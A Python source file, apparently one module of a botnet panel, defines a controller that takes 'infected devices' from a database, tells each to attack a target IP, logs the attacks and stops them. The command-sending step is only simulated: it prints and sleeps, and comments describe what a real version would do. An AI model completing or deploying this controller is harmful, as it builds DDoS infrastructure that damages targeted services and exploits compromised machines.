import telnetlib
import threading
import time
from .utils import Colors

class DDoSController:
    def __init__(self, database):
        self.db = database
        self.active_attacks = {}
    
    def send_command_to_bot(self, bot_ip, command):
        """Send command to bot client"""
        try:
            # For demo purposes, simulate sending commands
            print(f"{Colors.CYAN}[*] Sending '{command}' to bot {bot_ip}{Colors.RESET}")
            
            # Simulate command execution
            time.sleep(0.5)
            
            # In a real scenario, this would:
            # 1. Connect to the bot's command interface
            # 2. Send the attack command
            # 3. Verify command execution
            
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to send command to {bot_ip}: {e}{Colors.RESET}")
            return False
    
    def start_attack(self, target_ip, attack_type):
        """Start DDoS attack using infected devices"""
        infected_devices = self.db.get_infected_devices()
        
        if not infected_devices:
            print(f"{Colors.RED}[!] No infected devices available for attack.{Colors.RESET}")
            return
        
        print(f"{Colors.YELLOW}[*] Starting {attack_type} attack against {target_ip}...{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Using {len(infected_devices)} infected devices{Colors.RESET}")
        
        # Send attack commands to all bots
        successful_bots = []
        for bot_ip in infected_devices:
            command = f"attack {target_ip} {attack_type}"
            if self.send_command_to_bot(bot_ip, command):
                successful_bots.append(bot_ip)
        
        if successful_bots:
            # Log the attack
            self.db.log_attack(attack_type, target_ip, successful_bots, "active")
            self.active_attacks[target_ip] = {
                'type': attack_type,
                'bots': successful_bots,
                'start_time': time.time()
            }
            
            print(f"{Colors.GREEN}[+] Attack started with {len(successful_bots)} bots!{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Attack type: {attack_type.upper()}{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Target: {target_ip}{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Participating bots: {len(successful_bots)}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Failed to start attack - no bots responded.{Colors.RESET}")
    
    def stop_attack(self):
        """Stop all active DDoS attacks"""
        if not self.active_attacks:
            print(f"{Colors.YELLOW}[!] No active attacks to stop.{Colors.RESET}")
            return
        
        print(f"{Colors.YELLOW}[*] Stopping all active attacks...{Colors.RESET}")
        
        for target_ip, attack_info in self.active_attacks.items():
            print(f"{Colors.CYAN}[*] Stopping attack against {target_ip}...{Colors.RESET}")
            
            # Send stop commands to all bots
            for bot_ip in attack_info['bots']:
                self.send_command_to_bot(bot_ip, "stop")
        
        # Clear active attacks
        self.active_attacks.clear()
        
        # Update database
        import sqlite3
        conn = sqlite3.connect(self.db.db_file)
        cursor = conn.cursor()
        cursor.execute("UPDATE attack_logs SET status = 'stopped', end_time = ? WHERE status = 'active'", 
                      (time.strftime("%Y-%m-%d %H:%M:%S"),))
        conn.commit()
        conn.close()
        
        print(f"{Colors.GREEN}[+] All attacks stopped.{Colors.RESET}")
    
    def get_attack_status(self):
        """Get current attack status"""
        if self.active_attacks:
            print(f"{Colors.CYAN}=== Active Attacks ==={Colors.RESET}")
            for target, info in self.active_attacks.items():
                duration = int(time.time() - info['start_time'])
                print(f"🚀 {info['type']} -> {target} | {len(info['bots'])} bots | {duration}s")
        else:
            print(f"{Colors.YELLOW}No active attacks.{Colors.RESET}")
